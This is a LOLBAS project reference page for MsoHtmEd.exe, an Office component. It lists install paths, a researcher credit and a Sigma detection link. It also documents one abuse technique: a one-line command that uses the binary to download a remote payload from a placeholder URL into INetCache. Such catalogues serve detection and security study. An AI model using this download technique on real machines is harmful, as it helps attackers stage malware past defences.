---
title: "MsoHtmEd.exe"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/OtherMSBinaries/MsoHtmEd/
fetched_at: 2026-09-20T17:15:04Z
license: unspecified
category: windows
---

Microsoft Office component

## Paths
- C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSOHTMED.exe
- C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSOHTMED.exe
- C:\Program Files (x86)\Microsoft Office\Office16\MSOHTMED.exe
- C:\Program Files\Microsoft Office\Office16\MSOHTMED.exe
- C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\MSOHTMED.exe
- C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\MSOHTMED.exe
- C:\Program Files (x86)\Microsoft Office\Office15\MSOHTMED.exe
- C:\Program Files\Microsoft Office\Office15\MSOHTMED.exe
- C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\MSOHTMED.exe
- C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\MSOHTMED.exe
- C:\Program Files (x86)\Microsoft Office\Office14\MSOHTMED.exe
- C:\Program Files\Microsoft Office\Office14\MSOHTMED.exe
- C:\Program Files (x86)\Microsoft Office\Office12\MSOHTMED.exe
- C:\Program Files\Microsoft Office\Office12\MSOHTMED.exe
- C:\Program Files\Microsoft Office\Office12\MSOHTMED.exe

## Acknowledgements
- Nir Chako (Pentera) ([@C_h4ck_0](https://twitter.com/@C_h4ck_0))

## Detections
- Sigma: [https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_lolbin_msohtmed_download.yml](https://github.com/SigmaHQ/sigma/blob/19396788dbedc57249a46efed2bb1927abc376d4/rules/windows/process_creation/proc_creation_win_lolbin_msohtmed_download.yml)
- IOC: Suspicious Office application internet/network traffic

## Download

1. Downloads payload from remote server

```
MsoHtmEd.exe {REMOTEURL}
```

   - Use case: It will download a remote payload and place it in INetCache.

   - Privileges required: User

   - Operating systems: Windows 10, Windows 11

   - ATT&CK® technique: T1105

   - Tags: Download: INetCache
